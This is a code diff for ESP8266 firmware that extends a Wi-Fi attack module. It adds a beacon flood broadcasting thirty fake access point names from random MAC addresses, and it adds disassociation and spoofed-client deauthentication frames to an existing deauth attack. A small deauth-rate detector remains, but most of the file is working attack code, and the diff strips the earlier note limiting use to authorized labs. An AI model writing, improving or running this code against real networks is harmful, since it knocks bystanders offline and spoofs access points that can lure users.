@@ -1,15 +1,10 @@
 /*
- * wifi_attacks.cpp — WiFi deauthentication & packet monitoring
+ * wifi_attacks.cpp — WiFi deauthentication, beacon flood & monitoring
  *
  * ================================================================
  *  ⚠ EDUCATIONAL / DEFENSIVE RESEARCH USE ONLY
- *  This code is for authorized lab testing and defensive
- *  cybersecurity education in controlled environments.
+ *  Created by: Shawal Ahmad Mohmand
  * ================================================================
- *
- * Uses the ESP-IDF raw 802.11 frame injection API to send
- * deauthentication frames.  Also implements a promiscuous-mode
- * packet counter and basic deauth-flood detection.
  */
 
 #include "wifi_attacks.h"
@@ -18,7 +13,7 @@ extern "C" {
   #include "user_interface.h"
 }
 
-// ── State ────────────────────────────────────────────────────────
+// ── Deauth State ────────────────────────────────────────────────
 static WifiAttackState _state = WATK_IDLE;
 static uint8_t  _targetBSSID[6];
 static uint8_t  _targetChannel = 1;
@@ -30,39 +25,113 @@ static volatile uint32_t _pktCount = 0;
 static volatile uint32_t _deauthPktCount = 0;
 static unsigned long _pktCountStart = 0;
 
+// ── Beacon Flood State ──────────────────────────────────────────
+static bool _beaconRunning = false;
+static uint32_t _beaconCount = 0;
+static unsigned long _lastBeacon = 0;
+
+// Fake AP names for beacon flood
+static const char* _fakeSSIDs[] = {
+  "Free WiFi", "Airport_WiFi", "Starbucks_Guest",
+  "Hotel_Lobby", "FBI_Van_#3", "DefinitelyNotAVirus",
+  "Loading...", "Connecting...", "Network_Error",
+  "Government_Drone", "WiFi_Password_is_1234", "Drop_It_Like_Its_Hotspot",
+  "TheLANBeforeTime", "Hide_Yo_WiFi", "Bill_Wi_The_Science_Fi",
+  "Abraham_Linksys", "Wu_Tang_LAN", "Pretty_Fly_For_A_WiFi",
+  "Silence_Of_The_LANs", "It_Burns_When_IP",
+  "GetOffMyLAN", "The_Promised_LAN", "John_Wilkes_Bluetooth",
+  "Nacho_WiFi", "No_Free_WiFi_Here", "NotYourWiFi",
+  "PasswordIsTaco", "YellAtYourWiFi", "BringYourOwnWiFi",
+  "CantHackThis"
+};
+static const uint8_t _fakeSSIDCount = 30;
+
 /*
  * 802.11 deauthentication frame template (26 bytes)
- * Byte layout:
- *   [0-1]   Frame Control  = 0xC0 0x00  (Deauth)
- *   [2-3]   Duration       = 0x00 0x00
- *   [4-9]   Destination    = broadcast or client MAC
- *   [10-15] Source         = BSSID (spoofed as AP)
- *   [16-21] BSSID          = BSSID
- *   [22-23] Sequence       = 0x00 0x00
- *   [24-25] Reason code    = 0x01 0x00  (Unspecified)
  */
 static uint8_t _deauthFrame[26] = {
   0xC0, 0x00,                         // Frame Control: Deauth
   0x00, 0x00,                         // Duration
   0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: BSSID (filled at runtime)
-  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (filled at runtime)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: BSSID
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
   0x00, 0x00,                         // Sequence number
   0x01, 0x00                          // Reason code: Unspecified
 };
 
 /*
- * Promiscuous mode RX callback
- * Counts all received frames and separately counts deauth/disassoc.
+ * 802.11 disassociation frame template (26 bytes)
  */
-static void _promiscRxCb(uint8_t *buf, uint16_t len) {
-  if (len < 13) return; // Must have RxControl + at least 1 byte
-  _pktCount++;
+static uint8_t _disassocFrame[26] = {
+  0xA0, 0x00,                         // Frame Control: Disassoc
+  0x00, 0x00,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: BSSID
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x00, 0x00,                         // Sequence number
+  0x07, 0x00                          // Reason code: Class 3 frame
+};
 
-  // On ESP8266, buf typically starts with struct RxControl (12 bytes)
-  // The first byte of the 802.11 frame is at offset 12.
+/*
+ * 802.11 Beacon frame template
+ * Minimal beacon: frame control + duration + DA + SA + BSSID +
+ * seq + timestamp(8) + interval(2) + capabilities(2) +
+ * SSID tag + supported rates tag
+ */
+static uint8_t _beaconFrame[128];
+
+static void _buildBeacon(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
+  memset(_beaconFrame, 0, sizeof(_beaconFrame));
+  uint8_t ssidLen = strlen(ssid);
+  if (ssidLen > 32) ssidLen = 32;
+
+  uint8_t i = 0;
+  // Frame Control: Beacon
+  _beaconFrame[i++] = 0x80; _beaconFrame[i++] = 0x00;
+  // Duration
+  _beaconFrame[i++] = 0x00; _beaconFrame[i++] = 0x00;
+  // Destination: broadcast
+  memset(&_beaconFrame[i], 0xFF, 6); i += 6;
+  // Source: BSSID
+  memcpy(&_beaconFrame[i], bssid, 6); i += 6;
+  // BSSID
+  memcpy(&_beaconFrame[i], bssid, 6); i += 6;
+  // Sequence number
+  _beaconFrame[i++] = 0x00; _beaconFrame[i++] = 0x00;
+  // Timestamp (8 bytes, filled by hardware usually)
+  uint32_t ts = micros();
+  memcpy(&_beaconFrame[i], &ts, 4); i += 4;
+  memset(&_beaconFrame[i], 0, 4); i += 4;
+  // Beacon interval: 100 TU (0x0064)
+  _beaconFrame[i++] = 0x64; _beaconFrame[i++] = 0x00;
+  // Capabilities: ESS
+  _beaconFrame[i++] = 0x01; _beaconFrame[i++] = 0x04;
+  // SSID parameter set
+  _beaconFrame[i++] = 0x00;        // Tag: SSID
+  _beaconFrame[i++] = ssidLen;     // Length
+  memcpy(&_beaconFrame[i], ssid, ssidLen); i += ssidLen;
+  // Supported rates
+  _beaconFrame[i++] = 0x01; // Tag: Supported Rates
+  _beaconFrame[i++] = 0x08; // Length
+  _beaconFrame[i++] = 0x82; // 1 Mbps (basic)
+  _beaconFrame[i++] = 0x84; // 2 Mbps (basic)
+  _beaconFrame[i++] = 0x8B; // 5.5 Mbps (basic)
+  _beaconFrame[i++] = 0x96; // 11 Mbps (basic)
+  _beaconFrame[i++] = 0x24; // 18 Mbps
+  _beaconFrame[i++] = 0x30; // 24 Mbps
+  _beaconFrame[i++] = 0x48; // 36 Mbps
+  _beaconFrame[i++] = 0x6C; // 54 Mbps
+  // DS Parameter Set (channel)
+  _beaconFrame[i++] = 0x03; // Tag: DS Parameter Set
+  _beaconFrame[i++] = 0x01; // Length
+  _beaconFrame[i++] = channel;
+}
+
+// ── Promiscuous callback ────────────────────────────────────────
+static void _promiscRxCb(uint8_t *buf, uint16_t len) {
+  if (len < 13) return;
+  _pktCount++;
   uint8_t frameType = buf[12];
-  // Deauth = 0xC0, Disassoc = 0xA0
   if (frameType == 0xC0 || frameType == 0xA0) {
     _deauthPktCount++;
   }
@@ -71,17 +140,15 @@ static void _promiscRxCb(uint8_t *buf, uint16_t len) {
 // ── Public API ──────────────────────────────────────────────────
 
 void wifi_attacks_init() {
-  // Ensure WiFi is in STA mode
-  WiFi.mode(WIFI_STA);
-  WiFi.disconnect();
-  // Allow raw frame TX
+  wifi_set_opmode(STATION_MODE);
   wifi_promiscuous_enable(0);
+  WiFi.disconnect();
+  delay(10);
   DBGLN(F("[WATK] WiFi attacks subsystem initialized"));
 }
 
 /*
- * wifi_attacks_deauth_start()
- * Prepares and begins sending deauthentication frames to a target AP.
+ * DEAUTH — Fixed version with disassoc + proper spoofed client
  */
 void wifi_attacks_deauth_start(const uint8_t bssid[6], uint8_t channel) {
   memcpy(_targetBSSID, bssid, 6);
@@ -89,16 +156,21 @@ void wifi_attacks_deauth_start(const uint8_t bssid[6], uint8_t channel) {
   _frameCount = 0;
   _lastBurst = 0;
 
-  // Set WiFi channel
+  // Proper ESP8266 promiscuous setup for TX
+  wifi_set_opmode(STATION_MODE);
   wifi_promiscuous_enable(1);
   wifi_set_channel(_targetChannel);
 
-  // Fill the BSSID into the deauth frame template
+  // Fill BSSID into deauth frame
   memcpy(&_deauthFrame[10], _targetBSSID, 6);  // Source
   memcpy(&_deauthFrame[16], _targetBSSID, 6);  // BSSID
 
+  // Fill BSSID into disassoc frame
+  memcpy(&_disassocFrame[10], _targetBSSID, 6);
+  memcpy(&_disassocFrame[16], _targetBSSID, 6);
+
   _state = WATK_RUNNING;
-  DBGF("[WATK] Deauth started on ch%d  BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
+  DBGF("[WATK] Deauth started on ch%d BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
        channel, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
 }
 
@@ -108,11 +180,6 @@ void wifi_attacks_deauth_stop() {
   DBGF("[WATK] Deauth stopped. Total frames: %lu\n", _frameCount);
 }
 
-/*
- * wifi_attacks_update()
- * Non-blocking burst sender.  Call every loop().
- * Returns the number of frames sent this iteration.
- */
 uint16_t wifi_attacks_update() {
   if (_state != WATK_RUNNING) return 0;
 
@@ -125,35 +192,46 @@ uint16_t wifi_attacks_update() {
     // Update sequence number
     _deauthFrame[22] = (_frameCount & 0xFF);
     _deauthFrame[23] = ((_frameCount >> 8) & 0x0F);
+    _disassocFrame[22] = _deauthFrame[22];
+    _disassocFrame[23] = _deauthFrame[23];
 
-    // Broadcast deauth (AP → all clients)
+    // === Frame 1: AP → broadcast (deauth all clients) ===
     _deauthFrame[4] = 0xFF; _deauthFrame[5] = 0xFF;
     _deauthFrame[6] = 0xFF; _deauthFrame[7] = 0xFF;
     _deauthFrame[8] = 0xFF; _deauthFrame[9] = 0xFF;
     wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
-    _frameCount++;
-    sent++;
+    sent++; _frameCount++;
 
-    // Also send as if from client to AP (spoofed disconnect)
-    // Swap source/dest for a second frame
-    memcpy(&_deauthFrame[4], _targetBSSID, 6);   // Dest = BSSID
-    _deauthFrame[10] = 0xFF; _deauthFrame[11] = 0xFF;
-    _deauthFrame[12] = 0xFF; _deauthFrame[13] = 0xFF;
-    _deauthFrame[14] = 0xFF; _deauthFrame[15] = 0xFF;
+    // === Frame 2: AP → broadcast (disassociation) ===
+    _disassocFrame[4] = 0xFF; _disassocFrame[5] = 0xFF;
+    _disassocFrame[6] = 0xFF; _disassocFrame[7] = 0xFF;
+    _disassocFrame[8] = 0xFF; _disassocFrame[9] = 0xFF;
+    wifi_send_pkt_freedom(_disassocFrame, sizeof(_disassocFrame), 0);
+    sent++; _frameCount++;
+
+    // === Frame 3: Spoofed client → AP (pretend client is leaving) ===
+    // Random client MAC
+    uint8_t fakeClient[6];
+    fakeClient[0] = random(0x00, 0xFF) & 0xFE;  // Unicast
+    fakeClient[1] = random(0x00, 0xFF);
+    fakeClient[2] = random(0x00, 0xFF);
+    fakeClient[3] = random(0x00, 0xFF);
+    fakeClient[4] = random(0x00, 0xFF);
+    fakeClient[5] = random(0x00, 0xFF);
+
+    // Deauth: client→AP
+    memcpy(&_deauthFrame[4], _targetBSSID, 6);   // Dest = AP
+    memcpy(&_deauthFrame[10], fakeClient, 6);     // Src = fake client
     wifi_send_pkt_freedom(_deauthFrame, sizeof(_deauthFrame), 0);
-    _frameCount++;
-    sent++;
+    sent++; _frameCount++;
 
-    // Restore original template
-    _deauthFrame[4] = 0xFF; _deauthFrame[5] = 0xFF;
-    _deauthFrame[6] = 0xFF; _deauthFrame[7] = 0xFF;
-    _deauthFrame[8] = 0xFF; _deauthFrame[9] = 0xFF;
+    // Restore broadcast template
+    memset(&_deauthFrame[4], 0xFF, 6);
     memcpy(&_deauthFrame[10], _targetBSSID, 6);
 
-    delayMicroseconds(DEAUTH_DELAY_MS * 100);  // Small inter-frame gap
+    delayMicroseconds(DEAUTH_DELAY_MS * 100);
   }
 
-  DBGF("[WATK] Burst sent: %d frames (total: %lu)\n", sent, _frameCount);
   return sent;
 }
 
@@ -165,18 +243,75 @@ uint32_t wifi_attacks_getFrameCount() {
   return _frameCount;
 }
 
-/*
- * wifi_attacks_startPacketCounter()
- * Enables promiscuous mode to count all received frames.
- */
+// ── Beacon Flood (Fake APs) ─────────────────────────────────────
+
+void wifi_attacks_beacon_start() {
+  wifi_set_opmode(STATION_MODE);
+  wifi_promiscuous_enable(1);
+  wifi_set_channel(1);
+  _beaconRunning = true;
+  _beaconCount = 0;
+  _lastBeacon = 0;
+  DBGLN(F("[WATK] Beacon flood started"));
+}
+
+void wifi_attacks_beacon_stop() {
+  _beaconRunning = false;
+  wifi_promiscuous_enable(0);
+  DBGF("[WATK] Beacon flood stopped. Total: %lu\n", _beaconCount);
+}
+
+void wifi_attacks_beacon_update() {
+  if (!_beaconRunning) return;
+
+  unsigned long now = millis();
+  if (now - _lastBeacon < BEACON_INTERVAL_MS) return;
+  _lastBeacon = now;
+
+  for (uint8_t i = 0; i < BEACON_FRAME_COUNT; i++) {
+    uint8_t idx = random(0, _fakeSSIDCount);
+    uint8_t ch = random(1, 12);
+
+    // Random BSSID
+    uint8_t bssid[6];
+    bssid[0] = random(0x00, 0xFF) & 0xFE;
+    bssid[1] = random(0x00, 0xFF);
+    bssid[2] = random(0x00, 0xFF);
+    bssid[3] = random(0x00, 0xFF);
+    bssid[4] = random(0x00, 0xFF);
+    bssid[5] = random(0x00, 0xFF);
+
+    _buildBeacon(_fakeSSIDs[idx], bssid, ch);
+
+    // Calculate actual frame length
+    uint8_t ssidLen = strlen(_fakeSSIDs[idx]);
+    if (ssidLen > 32) ssidLen = 32;
+    uint8_t frameLen = 24 + 12 + 2 + ssidLen + 10 + 3; // header + fixed + ssid tag + rates + DS
+
+    wifi_send_pkt_freedom(_beaconFrame, frameLen, 0);
+    _beaconCount++;
+
+    delayMicroseconds(200);
+  }
+}
+
+bool wifi_attacks_beacon_isRunning() {
+  return _beaconRunning;
+}
+
+uint32_t wifi_attacks_beacon_getCount() {
+  return _beaconCount;
+}
+
+// ── Packet Counter ──────────────────────────────────────────────
+
 void wifi_attacks_startPacketCounter() {
   _pktCount = 0;
   _deauthPktCount = 0;
   _pktCountStart = millis();
-
   wifi_promiscuous_enable(1);
   wifi_set_promiscuous_rx_cb(_promiscRxCb);
-  DBGLN(F("[WATK] Packet counter started (promiscuous mode)"));
+  DBGLN(F("[WATK] Packet counter started"));
 }
 
 void wifi_attacks_stopPacketCounter() {
@@ -194,16 +329,9 @@ void wifi_attacks_resetPacketCount() {
   _pktCountStart = millis();
 }
 
-/*
- * wifi_attacks_detectInterference()
- * Heuristic: if more than 100 deauth/disassoc frames seen
- * within 10 seconds, flag as potential interference/attack.
- */
 bool wifi_attacks_detectInterference() {
   unsigned long elapsed = millis() - _pktCountStart;
   if (elapsed < 1000) return false;
-
-  // Rate: deauth frames per second
   float rate = (float)_deauthPktCount / (elapsed / 1000.0);
-  return rate > 10.0;   // > 10 deauth frames/sec is suspicious
+  return rate > 10.0;
 }
